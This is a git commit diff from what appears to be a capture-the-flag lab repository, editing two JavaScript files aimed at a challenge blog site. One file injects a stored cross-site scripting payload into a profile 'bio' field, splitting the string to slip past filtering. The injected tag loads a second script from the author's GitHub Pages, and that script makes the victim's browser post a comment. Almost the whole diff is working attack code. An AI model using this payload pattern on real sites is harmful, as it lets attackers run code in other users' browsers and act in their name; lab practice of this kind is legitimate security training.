801fc982589b0c99dc9f85c76c12b6c3c979b3c0
Matias Lima <matiaselima@hotmail.com>
2026-09-25 00:53:23 -0300

    viendo si funciona

--- blog_hacklab_v2/jeni.js
+++ blog_hacklab_v2/jeni.js
@@ -1,4 +1,4 @@
-<script>
+
   fetch('https://chl-ccdde8bd-d1b4-4896-99af-e358dc89319d-blog-hacklab-v2.softwareseguro.com.ar/comments', {
     method: 'POST',
     headers: {
@@ -7,4 +7,3 @@
     // Reemplaza 'parametro_foto' con el nombre real que viste en el paso 2
     body: 'content=comentandoo' 
   });
-</script>
--- blog_hacklab_v2/pepe.js
+++ blog_hacklab_v2/pepe.js
@@ -1,8 +1,10 @@
-<script>
+
 
   var formData = new FormData();
+
+  const payload = "<script src='https:/" + "/matiaselima.github.io/ctf/blog_hacklab_v2/jeni.js'></script>";
   
-  formData.append("bio", "<script src="https://matiaselima.github.io/ctf/blog_hacklab_v2/jeni.js"></script>"); 
+  formData.append("bio", payload); 
   formData.append("profile_pic", new Blob([""]), "");
 
   fetch('https://chl-ccdde8bd-d1b4-4896-99af-e358dc89319d-blog-hacklab-v2.softwareseguro.com.ar/biographies', {
@@ -10,4 +12,4 @@
     body: formData
 
   });
-</script>
+
